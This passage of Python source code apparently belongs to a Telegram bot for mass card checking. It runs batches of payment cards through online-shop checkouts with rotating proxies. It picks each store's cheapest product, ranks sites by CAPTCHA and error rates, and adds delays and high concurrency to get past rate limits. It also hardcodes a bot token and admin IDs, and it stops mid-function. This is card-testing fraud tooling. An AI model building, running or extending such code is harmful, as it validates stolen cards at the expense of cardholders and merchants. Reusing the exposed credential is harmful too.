import os
import io
import time
import random
import asyncio
import logging
import re
from datetime import datetime

from concurrent.futures import ThreadPoolExecutor, as_completed

from typing import List, Dict, Tuple, Optional
import threading

from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.error import RetryAfter
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    CallbackQueryHandler,
    filters,
)

import neww as checkout

import t2

import st

BOT_TOKEN = "8300350496:AAEfYkO8n_gA0jezzYar7jxRSaOe6gu8KQs"

GLOBAL_MAX_WORKERS = 500  # Increased from 200 for much faster parallel processing with large batches
# Dynamic batch workers based on batch size for optimal performance
def get_batch_workers(batch_size: int) -> int:
    """Calculate optimal batch workers based on batch size"""
    if batch_size < 100:
        return 50  # Small batches: 50 concurrent
    elif batch_size < 1000:
        return 200  # Medium batches: 200 concurrent
    elif batch_size < 10000:
        return 500  # Large batches: 500 concurrent
    else:
        return 1000  # Very large batches (100k+): 1000 concurrent
BATCH_WORKERS = 100  # Default for backwards compatibility
BROADCAST_WORKERS = 20

UPLOADS_DIR = "uploads"

BOT_PRODUCT_CACHE: Dict[str, Tuple[str, str, str, str]] = {}
BOT_PRODUCT_CACHE_LOCK = threading.Lock()

# Removal logging system
REMOVAL_LOGS: Dict[str, List[Dict]] = {
    "sites": [],  # List of dicts: {"url": str, "reason": str, "timestamp": float, "user_id": int}
    "proxies": []  # List of dicts: {"proxy": str, "reason": str, "timestamp": float, "user_id": int}
}
REMOVAL_LOGS_LOCK = threading.Lock()

# Proxy error logging system (rate limits, connection failures, etc.)
PROXY_ERROR_LOGS: List[Dict] = []  # List of dicts: {"proxy": str, "error_type": str, "error_msg": str, "timestamp": float, "user_id": int, "site": str}
PROXY_ERROR_LOGS_LOCK = threading.Lock()

# Site Health Tracking System
SITE_HEALTH: Dict[str, Dict] = {}  # {site_url: {success, captcha, error, total, last_success, last_captcha, last_error, health_score}}
SITE_HEALTH_LOCK = threading.Lock()

def update_site_health(site_url: str, result_type: str):
    """
    Update site health tracking.
    result_type: 'success', 'captcha', or 'error'
    """
    try:
        with SITE_HEALTH_LOCK:
            if site_url not in SITE_HEALTH:
                SITE_HEALTH[site_url] = {
                    "success": 0,
                    "captcha": 0,
                    "error": 0,
                    "total": 0,
                    "last_success": None,
                    "last_captcha": None,
                    "last_error": None,
                    "health_score": 100.0
                }
            
            site = SITE_HEALTH[site_url]
            site["total"] += 1
            
            timestamp = time.time()
            if result_type == "success":
                site["success"] += 1
                site["last_success"] = timestamp
            elif result_type == "captcha":
                site["captcha"] += 1
                site["last_captcha"] = timestamp
            elif result_type == "error":
                site["error"] += 1
                site["last_error"] = timestamp
            
            # Calculate health score (0-100)
            # Success = +points, CAPTCHA = -points, Error = -points
            if site["total"] > 0:
                success_rate = (site["success"] / site["total"]) * 100
                captcha_penalty = (site["captcha"] / site["total"]) * 50  # CAPTCHA hurts score
                error_penalty = (site["error"] / site["total"]) * 30
                
                site["health_score"] = max(0, min(100, success_rate - captcha_penalty - error_penalty))
            
            # Keep only last 10000 sites to prevent memory issues
            if len(SITE_HEALTH) > 10000:
                # Remove oldest sites (by last activity)
                sorted_sites = sorted(
                    SITE_HEALTH.items(),
                    key=lambda x: max(
                        x[1].get("last_success") or 0,
                        x[1].get("last_captcha") or 0,
                        x[1].get("last_error") or 0
                    )
                )
                # Keep only most recent 8000
                sites_to_remove = [s[0] for s in sorted_sites[:2000]]
                for s in sites_to_remove:
                    SITE_HEALTH.pop(s, None)
    
    except Exception as e:
        logger.error(f"Error updating site health: {e}")

def get_optimized_sites(sites: List[str], min_health_score: float = 30.0, max_sites: int = None) -> List[str]:
    """
    Optimize site list using health tracking.
    Returns sites sorted by health score (best first), filtering out very bad sites.
    
    Args:
        sites: Original list of sites
        min_health_score: Minimum health score (0-100) to include a site. Default 30 = skip sites with 70%+ CAPTCHA rate
        max_sites: Maximum number of sites to return. None = use all sites (default)
    
    Returns:
        Optimized list of sites sorted by health score (best first)
    """
    try:
        with SITE_HEALTH_LOCK:
            site_health_copy = SITE_HEALTH.copy()
        
        # Normalize site URLs for comparison
        normalized_map = {}
        for site in sites:
            try:
                normalized = checkout.normalize_shop_url(site).rstrip("/")
                normalized_map[normalized] = site
            except Exception:
                normalized_map[site] = site
        
        # Separate sites into: tracked (with health data) and untracked (new sites)
        tracked_sites = []
        untracked_sites = []
        
        for normalized, original in normalized_map.items():
            if normalized in site_health_copy:
                health = site_health_copy[normalized]
                score = health.get("health_score", 100.0)
                total_checks = health.get("total", 0)
                
                # Filter out very bad sites (high CAPTCHA rate)
                if score >= min_health_score or total_checks < 3:  # Give new sites a chance (< 3 checks)
                    tracked_sites.append({
                        "url": original,
                        "normalized": normalized,
                        "score": score,
                        "total": total_checks,
                        "last_success": health.get("last_success", 0)
                    })
            else:
                # Untracked site - assume healthy (no data yet)
                untracked_sites.append(original)
        
        # Sort tracked sites by:
        # 1. Health score (higher is better)
        # 2. Recent success (more recent is better)
        # 3. Total checks (more data is more reliable)
        tracked_sites.sort(
            key=lambda x: (
                x["score"],  # Primary: health score
                x["last_success"] or 0,  # Secondary: recency
                min(x["total"], 100)  # Tertiary: reliability (cap at 100 to avoid overweighting)
            ),
            reverse=True
        )
        
        # Build optimized list:
        # 1. Top tracked healthy sites (score >= 70)
        # 2. Untracked sites (randomly shuffled for variety)
        # 3. Medium-scored tracked sites (30-70%)
        # ALL sites are included, just reordered by health!
        optimized = []
        
        # Add top healthy sites first (score >= 70)
        healthy = [s["url"] for s in tracked_sites if s["score"] >= 70]
        optimized.extend(healthy)
        
        # Add untracked sites (might be hidden gems)
        import random
        random.shuffle(untracked_sites)
        optimized.extend(untracked_sites)
        
        # Add medium-scored tracked sites
        medium = [s["url"] for s in tracked_sites if 30 <= s["score"] < 70]
        optimized.extend(medium)
        
        # Apply max_sites limit if specified
        if max_sites and len(optimized) > max_sites:
            optimized = optimized[:max_sites]
        
        # Fallback: if no optimization data, return original (shuffled for variety)
        if not optimized:
            optimized = list(sites)
            random.shuffle(optimized)
            if max_sites:
                optimized = optimized[:max_sites]
        
        logger.info(f"Site optimization: {len(sites)} total → {len(optimized)} optimized (min_score={min_health_score}, healthy={len(healthy)}, untracked={len(untracked_sites)}, max_sites={max_sites or 'ALL'})")
        return optimized
    
    except Exception as e:
        logger.error(f"Error optimizing sites: {e}")
        # Fallback: return original sites
        import random
        result = list(sites)
        random.shuffle(result)
        if max_sites:
            return result[:max_sites]
        return result

def log_proxy_error(proxy_url: str, error_type: str, error_msg: str, user_id: Optional[int] = None, site: Optional[str] = None):
    """Log a proxy error (429, connection failures, etc.)"""
    try:
        if not proxy_url or not isinstance(proxy_url, str) or len(proxy_url.strip()) == 0:
            logger.warning(f"log_proxy_error called with invalid proxy_url: {proxy_url}, error_type: {error_type}")
            return
        
        with PROXY_ERROR_LOGS_LOCK:
            PROXY_ERROR_LOGS.append({
                "proxy": proxy_url.strip(),
                "error_type": error_type,
                "error_msg": error_msg[:500] if error_msg else "Unknown error",  # Limit message length
                "timestamp": time.time(),
                "user_id": user_id,
                "site": (site or "Unknown")[:200]  # Limit site length
            })
            # Keep only last 50000 errors to prevent memory issues
            if len(PROXY_ERROR_LOGS) > 50000:
                PROXY_ERROR_LOGS[:] = PROXY_ERROR_LOGS[-50000:]
            
            # Debug logging for 429 errors to verify they're being logged
            if error_type == "429_Rate_Limit":
                logger.debug(f"Logged 429 error: proxy={mask_proxy(proxy_url)}, site={site}, user_id={user_id}")
    except Exception as e:
        logger.error(f"Error logging proxy error: {e}", exc_info=True)

def log_site_removal(url: str, reason: str, user_id: Optional[int] = None):
    """Log a site removal with reason"""
    try:
        with REMOVAL_LOGS_LOCK:
            REMOVAL_LOGS["sites"].append({
                "url": url,
                "reason": reason,
                "timestamp": time.time(),
                "user_id": user_id
            })
            # Keep only last 10000 removals to prevent memory issues
            if len(REMOVAL_LOGS["sites"]) > 10000:
                REMOVAL_LOGS["sites"] = REMOVAL_LOGS["sites"][-10000:]
    except Exception as e:
        logger.error(f"Error logging site removal: {e}")

def log_proxy_removal(proxy: str, reason: str, user_id: Optional[int] = None):
    """Log a proxy removal with reason"""
    try:
        with REMOVAL_LOGS_LOCK:
            REMOVAL_LOGS["proxies"].append({
                "proxy": proxy,
                "reason": reason,
                "timestamp": time.time(),
                "user_id": user_id
            })
            # Keep only last 10000 removals to prevent memory issues
            if len(REMOVAL_LOGS["proxies"]) > 10000:
                REMOVAL_LOGS["proxies"] = REMOVAL_LOGS["proxies"][-10000:]
    except Exception as e:
        logger.error(f"Error logging proxy removal: {e}")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger("tg-bot")

def _parse_admin_ids_env() -> set:
    raw = os.getenv("BOT_ADMINS", "").strip()
    if not raw:
        return set()
    ids = set()
    for tok in raw.replace(";", ",").replace(" ", ",").split(","):
        tok = tok.strip()
        if tok.isdigit():
            try:
                ids.add(int(tok))
            except Exception:
                pass
    return ids

ADMIN_IDS = _parse_admin_ids_env()

HARDCODED_ADMIN_IDS = [6307224822, 6028572049, 5646492454, 6224953439, 5733576801, -1002798580895]

# Restricted user IDs - these users' proxy info cannot be viewed/modified even by admins
RESTRICTED_USER_IDS = [6028572049, 6307224822]

def _load_removed_admins() -> set:
    """Load the list of admins that were explicitly removed via /rmadmin"""
    try:
        import json
        if os.path.exists("access_policy.json"):
            with open("access_policy.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                return set(data.get("removed_admin_ids", []))
    except Exception:
        pass
    return set()

try:
    removed_admins = _load_removed_admins()
    for admin_id in HARDCODED_ADMIN_IDS:
        if admin_id not in removed_admins:
            ADMIN_IDS.add(admin_id)
except Exception:
    ADMIN_IDS = set([6307224822])
STATS_FILE = "user_stats.json"
STATS_LOCK = threading.Lock()
APPROVED_FILE_LOCK = threading.Lock()
ACTIVE_BATCHES: Dict[str, Dict] = {}
ACTIVE_LOCK = asyncio.Lock()

# ACHK pending results - stores results waiting for amount input
ACHK_PENDING: Dict[int, Dict] = {}  # {user_id: {"results": list, "total_urls": int, "checking_msg": Message}}
ACHK_LOCK = asyncio.Lock()

async def has_active_batch(user_id: int) -> bool:
    """Check if user has an active batch running (admins bypass this check)"""
    if is_admin(user_id):
        return False  # Admins can run multiple checks
    try:
        async with ACTIVE_LOCK:
            for batch_id, batch_info in ACTIVE_BATCHES.items():
                if batch_info.get("user_id") == user_id:
                    # Check if batch is actually still running (not completed)
                    counts = batch_info.get("counts", {})
                    processed = counts.get("processed", 0)
                    total = counts.get("total", 0)
                    if processed < total:
                        return True
    except Exception:
        pass
    return False

PENDING_FILE = "pending_batches.json"
PENDING_LOCK = asyncio.Lock()  # Changed from threading.Lock to asyncio.Lock

def _load_pending() -> Dict[str, Dict]:
    try:
        import json
        if not os.path.exists(PENDING_FILE):
            return {}
        with open(PENDING_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, dict) else {}
    except Exception:
        return {}

def _save_pending(pending: Dict[str, Dict]) -> None:
    try:
        import json
        tmp = PENDING_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(pending, f, indent=2, ensure_ascii=False)
        os.replace(tmp, PENDING_FILE)
    except Exception:
        pass

async def add_pending(batch_id: str, payload: Dict) -> None:
    async with PENDING_LOCK:  # Changed to async with
        data = _load_pending()
        try:
            current = data.get(str(batch_id), {})
            if "processed" in current:
                payload["processed"] = current["processed"]
            data[str(batch_id)] = payload or {}
        except Exception:
            data[str(batch_id)] = {}
        _save_pending(data)

async def remove_pending(batch_id: str) -> None:
    async with PENDING_LOCK:  # Changed to async with
        data = _load_pending()
        try:
            data.pop(str(batch_id), None)
        except Exception:
            pass
        _save_pending(data)

async def list_pending() -> Dict[str, Dict]:
    async with PENDING_LOCK:
        return _load_pending()

class RestartChatProxy:
    def __init__(self, bot, chat_id: int):
        self._bot = bot
        self.id = chat_id
    async def send_message(self, text: str, parse_mode=None, disable_web_page_preview=True, reply_markup=None):
        return await self._bot.send_message(chat_id=self.id, text=text, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview, reply_markup=reply_markup)

class RestartUserProxy:
    def __init__(self, user_id: int, name: str, username: Optional[str] = None):
        self.id = user_id
        self.full_name = name or str(user_id)
        self.username = username or None

class RestartUpdate:
    def __init__(self, chat_proxy: RestartChatProxy, user_proxy: RestartUserProxy):
        self.effective_chat = chat_proxy
        self.effective_user = user_proxy
        self.callback_query = None
        self.message = None

class RestartContext:
    def __init__(self, bot, application):
        self.bot = bot
        self.application = application
        self.chat_data = {}

async def resume_pending_batches(app):
    try:
        pend = await list_pending()
    except Exception:
        pend = {}
    if not isinstance(pend, dict) or not pend:
        return
    bot = app.bot
    for batch_id, payload in pend.items():
        try:
            chat_id = int(payload.get("chat_id"))
            user_id = int(payload.get("user_id"))
            title = payload.get("title") or "Batch"
            cards = payload.get("cards") or []
            sites = payload.get("sites") or []
            send_approved = bool(payload.get("send_approved_notifications", True))
            if not isinstance(cards, list) or not isinstance(sites, list) or not chat_id or not user_id:
                continue
            # Skip /st and /sc batches (they don't use sites and can't use BatchRunner)
            if not sites or len(sites) == 0:
                logger.info(f"Skipping resume for {title} batch {batch_id} (no sites - likely /st or /sc)")
                await remove_pending(batch_id)
                continue
            try:
                s = await get_user_stats(user_id)
                display_name = (s.get("name") or str(user_id)).strip()
            except Exception:
                display_name = str(user_id)
            chat_proxy = RestartChatProxy(bot, chat_id)
            user_proxy = RestartUserProxy(user_id, display_name)
            update_like = RestartUpdate(chat_proxy, user_proxy)
            context_like = RestartContext(bot, app)
            cancel_event = asyncio.Event()
            
            processed = 0
            original_total = len(cards) if isinstance(cards, list) else 0
            try:
                processed = int(payload.get("processed", 0))
                if processed > 0 and isinstance(cards, list):
                    # Slice cards to only include remaining ones, but preserve original_total for progress display
                    cards = cards[processed:]
            except Exception:
                processed = 0
                
            proxy_mapping = None
            try:
                plist = await get_user_proxies(user_id)
                if isinstance(plist, list) and len(plist) > 0:
                    proxy_mapping = list(plist)
            except Exception:
                proxy_mapping = None
            
            # Skip resuming if user has no proxies - batch will resume when proxies are added via /setpr
            if not proxy_mapping or (isinstance(proxy_mapping, list) and len(proxy_mapping) == 0):
                logger.info(f"Skipping resume for batch {batch_id} - user {user_id} has no proxies. Will resume when proxies are added.")
                continue
            
            resumed_batch_id = str(batch_id)
            try:
                chosen_executor = GLOBAL_EXECUTOR if (isinstance(cards, list) and len(cards) > SMALL_BATCH_THRESHOLD) else SMALL_TASK_EXECUTOR
            except Exception:
                chosen_executor = GLOBAL_EXECUTOR
            # Pass total_override to preserve the original total count when resuming
            runner = BatchRunner(cards, sites, chosen_executor, resumed_batch_id, chat_id, user_id, cancel_event, 
                            send_approved_notifications=send_approved, proxies_override=proxy_mapping, start_from=processed, total_override=original_total)
            app.create_task(runner.run_with_notifications(update_like, context_like, title=title))
        except Exception as e:
            try:
                logger.warning(f"Failed to resume batch {batch_id}: {e}")
            except Exception:
                pass

async def _post_init(app):
    try:
        await resume_pending_batches(app)
    except Exception as e:
        try:
            logger.warning(f"resume_pending_batches failed in post_init: {e}")
        except Exception:
            pass

ACCESS_FILE = "access_policy.json"
ACCESS_LOCK = threading.Lock()

REQUIRED_CHANNELS = []
CHANNEL_MEMBERSHIP_CACHE: Dict[int, Dict[str, bool]] = {}
CHANNEL_CACHE_LOCK = threading.Lock()
CHANNEL_CACHE_DURATION = 300

from bot1 import ensure_uploads_dir, _sanitize_filename_component, _username_prefix_for_file, parse_cards_from_text, parse_cards_from_file, progress_block, format_site_label, classify_prefix, result_notify_text

from bot2 import is_admin, inc_user_stats, get_user_stats, get_all_stats, add_user_proxy, get_user_proxies, get_user_proxy, PROXIES_LOCK, _read_proxy_records, _write_proxy_records, _save_stats, _load_stats, STATS_LOCK, get_user_info_for_proxy

# Import load balancing router for /txt command
import cmd_txt_router

async def clear_user_proxy(user_id: int) -> None:
    """Remove all proxies for this user."""
    uid = str(int(user_id))
    with PROXIES_LOCK:
        recs = _read_proxy_records()
        recs = [(u, n, un, p, t) for (u, n, un, p, t) in recs if u != uid]
        _write_proxy_records(recs)

async def remove_user_proxy(user_id: int, proxy_url: str, reason: Optional[str] = None) -> None:
    """Remove a specific proxy for this user."""
    uid = str(int(user_id))
    target = (proxy_url or "").strip()
    if not target:
        return
    with PROXIES_LOCK:
        recs = _read_proxy_records()
        recs = [(u, n, un, p, t) for (u, n, un, p, t) in recs if not (u == uid and p.strip() == target)]
        _write_proxy_records(recs)
    # Log the removal (always log, use default reason if none provided)
    log_proxy_removal(target, reason or "Manual removal", user_id)

def normalize_proxy_url(p: Optional[str]) -> Optional[str]:
    try:
        if not p:
            return None
        s = p.strip()
        if not s or s.startswith("#"):
            return None
        lower = s.lower()
        if lower.startswith(("http://", "https://", "socks5://", "socks5h://")):
            return s
        parts = s.split(":")
        if len(parts) >= 4:
            host = parts[0]
            port = parts[1]
            user = ":".join(parts[2:-1]) if len(parts) > 4 else parts[2]
            pwd = parts[-1]
            try:
                from urllib.parse import quote as _q
            except Exception:
                def _q(x, safe=""):
                    return x
            user_enc = _q(user, safe="")
            pwd_enc = _q(pwd, safe="")
            return f"http://{user_enc}:{pwd_enc}@{host}:{port}"
        return f"http://{s}"
    except Exception:
        return None

def _load_access() -> Dict:
    try:
        import json
        if not os.path.exists(ACCESS_FILE):
            return {"restrict_all": False, "allow_only_ids": [], "blocked_ids": [], "allowed_groups": [], "groups_only": False, "perms": {}, "admin_ids": [], "removed_admin_ids": [], "bypass_groups_only": []}
        with open(ACCESS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            if not isinstance(data, dict):
                return {"restrict_all": False, "allow_only_ids": [], "blocked_ids": [], "allowed_groups": [], "groups_only": False}
            ra = bool(data.get("restrict_all", False))
            allow = data.get("allow_only_ids", []) or []
            block = data.get("blocked_ids", []) or []
            allowed_groups = data.get("allowed_groups", []) or []
            groups_only = bool(data.get("groups_only", False))
            try:
                allow = [int(x) for x in allow if str(x).strip()]
            except Exception:
                allow = []
            try:
                block = [int(x) for x in block if str(x).strip()]
            except Exception:
                block = []
            try:
                allowed_groups = [int(x) for x in allowed_groups if str(x).strip()]
            except Exception:
                allowed_groups = []
            admin_ids = data.get("admin_ids", []) or []
            perms = data.get("perms", {}) or {}
            try:
                admin_ids = [int(x) for x in admin_ids if str(x).strip()]
            except Exception:
                admin_ids = []
            removed_admin_ids = data.get("removed_admin_ids", []) or []
            try:
                removed_admin_ids = [int(x) for x in removed_admin_ids if str(x).strip()]
            except Exception:
                removed_admin_ids = []
            bypass_groups_only = data.get("bypass_groups_only", []) or []
            try:
                bypass_groups_only = [int(x) for x in bypass_groups_only if str(x).strip()]
            except Exception:
                bypass_groups_only = []
            return {"restrict_all": ra, "allow_only_ids": allow, "blocked_ids": block, "allowed_groups": allowed_groups, "groups_only": groups_only, "perms": perms, "admin_ids": admin_ids, "removed_admin_ids": removed_admin_ids, "bypass_groups_only": bypass_groups_only}
    except Exception:
        return {"restrict_all": False, "allow_only_ids": [], "blocked_ids": [], "allowed_groups": [], "groups_only": False, "perms": {}, "admin_ids": [], "removed_admin_ids": [], "bypass_groups_only": []}

def _save_access(policy: Dict) -> None:
    try:
        import json
        tmp = ACCESS_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(policy, f, indent=2, ensure_ascii=False)
        os.replace(tmp, ACCESS_FILE)
    except Exception:
        pass

async def get_access_policy() -> Dict:
    with ACCESS_LOCK:
        return _load_access()

async def set_access_policy(policy: Dict) -> None:
    with ACCESS_LOCK:
        base = {
            "restrict_all": False, 
            "allow_only_ids": [], 
            "blocked_ids": [], 
            "allowed_groups": [], 
            "groups_only": False,
            "bypass_groups_only": [],
            "perms": {}, 
            "admin_ids": []
        }
        try:
            base.update(policy or {})
        except Exception:
            pass
        _save_access(base)

def is_admin(user_id: int) -> bool:
    """Check if a user is an admin (either in ADMIN_IDS or in policy admin_ids)."""
    try:
        if user_id in ADMIN_IDS:
            return True
        policy = _load_access()
        admin_ids = policy.get("admin_ids") or []
        return user_id in admin_ids
    except Exception:
        return False

async def has_permission(user_id: int, command: str) -> bool:
    """
    Check if a user has permission to run a specific command.
    Admins always have permission. Otherwise, check the perms dictionary.
    """
    try:
        if is_admin(user_id):
            return True
        policy = await get_access_policy()
        perms = policy.get("perms") or {}
        user_perms = perms.get(str(user_id)) or []
        cmd = command.lstrip('/')
        return any(cmd.lower() == p.lower() for p in user_perms)
    except Exception:
        return False

async def is_user_allowed(user_id: int, chat_id: int, chat_type: Optional[str] = None, check_groups_only: bool = True) -> bool:
    """
    Determine whether a user/chat is allowed to use the bot.

    - If user is an admin -> allowed.
    - If allow_only list is present -> only those user ids or chat ids are allowed.
    - If groups_only is True -> personal (private) chats are denied; if allowed_groups is non-empty, only those group chat ids are allowed.
    - Otherwise honor restrict_all and blocked_ids as before.
    
    Args:
        check_groups_only: If False, ignore the groups_only setting (for commands that should work even in groups-only mode)
    """
    try:
        if is_admin(user_id):
            return True
    except Exception:
        return False
    p = await get_access_policy()
    allow_only = p.get("allow_only_ids") or []
    restrict_all = bool(p.get("restrict_all", False))
    blocked = p.get("blocked_ids") or []
    allowed_groups = p.get("allowed_groups") or []
    groups_only = bool(p.get("groups_only", False)) and check_groups_only
    try:
        if groups_only:
            if chat_type and str(chat_type).lower() == 'private':
                bypass_users = p.get("bypass_groups_only", []) or []
                if user_id in bypass_users:
                    return True
                return False
            if allowed_groups:
                try:
                    if int(chat_id) not in allowed_groups:
                        return False
                except Exception:
                    return False

        if allow_only:
            return (user_id in allow_only) or (chat_id in allow_only)

        if restrict_all:
            return False
        if user_id in blocked:
            return False
        return True
    except Exception:
        return False

async def check_channel_membership(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> Tuple[bool, List[str]]:
    return True, []

async def ensure_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        chat_type = getattr(update.effective_chat, "type", None)
        
        msg_text = (update.message.text or "").strip().lower() if update.message else ""
        if msg_text.startswith("/setpr"):
            return await is_user_allowed(user_id, chat_id, chat_type, check_groups_only=False)
            
        allowed = await is_user_allowed(user_id, chat_id, chat_type)
        if not allowed:
            await update.message.reply_text(
                "Access restricted.\n\n"
                "Join Group To Check: https://t.me/+l1aMGXxYLRYyZDZk\n\n"
                "Owner: @LeVetche"
            )
            return False
            
        return True
    except Exception:
        try:
            await update.effective_chat.send_message(
                "Access restricted.\n\n"
                "Join Group To Check: https://t.me/+l1aMGXxYLRYyZDZk\n\n"
                "Owner: @LeVetche"
            )
        except Exception:
            pass
        return False

def mask_proxy_password(proxy_url: str) -> str:
    """Mask the password in a proxy URL, leaving other parts visible."""
    try:
        if not proxy_url or ":" not in proxy_url:
            return proxy_url
        
        if "//" in proxy_url:
            if "@" in proxy_url:
                prefix, rest = proxy_url.rsplit("@", 1)
                if ":" in prefix:
                    parts = prefix.split(":")
                    if len(parts) >= 2:
                        return f"{':'.join(parts[:-1])}:****@{rest}"
            return proxy_url
            
        parts = proxy_url.split(":")
        if len(parts) >= 4:
            return f"{':'.join(parts[:-1])}:****"
            
        return proxy_url
    except Exception:
        return proxy_url

async def get_user_proxy_info(user_id: int) -> Optional[Tuple[str, str, str]]:
    """Get a user's current proxy info: (proxy_url, display_name, username)."""
    uid = str(int(user_id))
    with PROXIES_LOCK:
        recs = _read_proxy_records()
        for (u, name, username, proxy, _) in recs:
            if u == uid:
                return (proxy, name, username)
    return None

def check_single_card(card: Dict, sites: List[str], proxies_override: Optional[Dict[str, str]] = None, runner=None) -> Tuple[str, str, str, str, Optional[str], Optional[str], Optional[str]]:
    last_exception_msg: Optional[str] = None
    try:
        card_data = {**checkout.CARD_DATA, **card}
    except Exception:
        card_data = card

    try:
        checkout.init_proxies()
    except Exception:
        pass

    global BOT_PRODUCT_CACHE, BOT_PRODUCT_CACHE_LOCK
    site_product_cache = BOT_PRODUCT_CACHE
    filtered_sites = []
    if isinstance(sites, list):
        for site in sites:
            try:
                if "robalostore" not in site.lower():
                    filtered_sites.append(site)
            except Exception:
                filtered_sites.append(site)
    else:
        filtered_sites = list(sites) if sites else []
    
    try:
        pan_digits = "".join([c for c in str(card_data.get("number", "")) if c.isdigit()])
    except Exception:
        pan_digits = ""
    total_sites = len(filtered_sites) if isinstance(filtered_sites, list) else 0
    if total_sites > 0:
        try:
            offset = int(pan_digits[-2:]) % total_sites if pan_digits else random.randint(0, total_sites - 1)
        except Exception:
            offset = 0
        ordered_sites = filtered_sites[offset:] + filtered_sites[:offset]
    else:
        ordered_sites = list(filtered_sites) if isinstance(filtered_sites, list) else []
    
    used_proxy_url = None
    try:
        if isinstance(proxies_override, dict) and proxies_override:
            used_proxy_url = proxies_override.get('https') or proxies_override.get('http') or None
            if used_proxy_url and not str(used_proxy_url).strip():
                used_proxy_url = None
    except Exception:
        used_proxy_url = None
    
    for site_idx, site in enumerate(ordered_sites):
        # Check for cancellation BEFORE starting this site
        try:
            if runner and hasattr(runner, 'cancel_event') and runner.cancel_event.is_set():
                return ("unknown", '"code": "CANCELLED"', "$0", "", used_proxy_url, None, None)
        except Exception:
            pass
        
        # Add delay between sites to prevent rate limiting (skip first site)
        # Increased delay to reduce 429 rate limit errors and connection timeouts
        if site_idx > 0:
            # For large batches, use moderate delay; for small batches, use longer delay
            batch_size = getattr(runner, 'total', None) if runner else None
            if batch_size and batch_size > 1000:
                # Large batches: moderate delay to reduce proxy errors
                time.sleep(random.uniform(0.2, 0.5))  # 200-500ms delay
            else:
                # Small batches: longer delay to prevent rate limiting
                for _ in range(3):  # Increased from 2 to 3
                    try:
                        if runner and hasattr(runner, 'cancel_event') and runner.cancel_event.is_set():
                            return ("unknown", '"code": "CANCELLED"', "$0", "", used_proxy_url, None, None)
                    except Exception:
                        pass
                    time.sleep(random.uniform(0.3, 0.7))  # Increased from 0.05-0.15 to 0.3-0.7
        
        try:
            shop_url = checkout.normalize_shop_url(site)
            site_label = format_site_label(shop_url)
            if isinstance(proxies_override, dict) and proxies_override:
                proxies_mapping = proxies_override
                try:
                    used_proxy_url = proxies_override.get('https') or proxies_override.get('http') or used_proxy_url
                except Exception:
                    pass
            else:
                proxies_mapping, used_proxy_url = checkout.get_next_proxy_mapping()
            session = checkout.create_session(shop_url, proxies=proxies_mapping)

            # Check for cancellation before product detection (can be slow)
            try:
                if runner and hasattr(runner, 'cancel_event') and runner.cancel_event.is_set():
                    return ("unknown", '"code": "CANCELLED"', "$0", "", used_proxy_url, None, None)
            except Exception:
                pass

            with BOT_PRODUCT_CACHE_LOCK:
                cached = site_product_cache.get(shop_url)
            if cached:
                product_id, variant_id, price, title = cached
            else:
                product_id, variant_id, price, title = checkout.auto_detect_cheapest_product(session, shop_url)
                if variant_id:
                    with BOT_PRODUCT_CACHE_LOCK:
                        site_product_cache[shop_url] = (product_id, variant_id, price, title)
                    if runner:
                        try:
                            with runner._proxy_idx_lock:
                                runner.product_detection_failures = 0
                        except Exception:
                            pass
                else:
                    is_proxy_issue = False
                    is_closed_store = False
                    try:
                        test_url = f"{shop_url}/products.json?limit=1"
                        test_response = session.get(test_url, timeout=10, verify=False)
                        if test_response.status_code == 200:
                            logger.info(f"Site {shop_url} is reachable but has no products (closed/empty store)")
                            is_proxy_issue = False
                            is_closed_store = True
                        elif test_response.status_code == 404:
                            # Site returns 404 - site is dead/deleted, remove it
                            logger.warning(f"Site {shop_url} returned 404 - site not found (deleted/closed)")
                            is_proxy_issue = False
                            is_closed_store = False
                            try:
                                checkout.remove_site_from_working_sites(shop_url)
                                reason = f"HTTP 404 - Site not found during product detection (deleted/closed)"
                                log_site_removal(shop_url, reason)
                                logger.info(f"Removed site {shop_url} from working_sites.txt due to 404 error during product detection")
                                print(f"[DEBUG] Product detection - Site {shop_url} removed from working_sites.txt (404 error)")
                            except Exception as e:
                                logger.error(f"Failed to remove site {shop_url} due to 404: {e}")
                            
                            # Remove from current sites list and continue to next site
                            try:
                                with BOT_PRODUCT_CACHE_LOCK:
                                    if shop_url in site_product_cache:
                                        del site_product_cache[shop_url]
                            except Exception:
                                pass
                            try:
                                normalized_target = checkout.normalize_shop_url(shop_url).rstrip("/")
                                sites[:] = [s for s in sites if checkout.normalize_shop_url(s).rstrip("/") != normalized_target]
                                print(f"[DEBUG] Product detection - Site removed from current sites list (404)")
                            except Exception as e:
                                print(f"[DEBUG] Product detection - Failed to remove site from list: {e}")
                            continue  # Skip to next site
                        else:
                            logger.warning(f"Site {shop_url} returned status {test_response.status_code}")
                            is_proxy_issue = False
                    except Exception as e:
                        err_msg = str(e).lower()
                        if any(sig in err_msg for sig in ["connection", "proxy", "tunnel", "timeout"]):
                            logger.warning(f"Connection error to {shop_url}: {e}")
                            is_proxy_issue = True
                        else:
                            logger.warning(f"Site error (not proxy): {e}")
                            is_proxy_issue = False
                    
                    if is_closed_store:
                        try:
                            with BOT_PRODUCT_CACHE_LOCK:
                                if shop_url in site_product_cache:
                                    del site_product_cache[shop_url]
                        except Exception:
                            pass
                        # DISABLED: Site removal disabled - never remove sites
                        # try:
                        #     checkout.remove_site_from_working_sites(shop_url)
                        #     log_site_removal(shop_url, "Closed store - no products available")
                        #     logger.info(f"Removed closed store from working_sites.txt: {shop_url}")
                        # except Exception as e:
                        #     logger.error(f"Failed to remove closed store: {e}")
                        logger.info(f"Site {shop_url} detected as closed store but removal is disabled")
                        try:
                            normalized_target = checkout.normalize_shop_url(shop_url).rstrip("/")
                            sites[:] = [s for s in sites if checkout.normalize_shop_url(s).rstrip("/") != normalized_target]
                        except Exception:
                            pass
                        if runner:
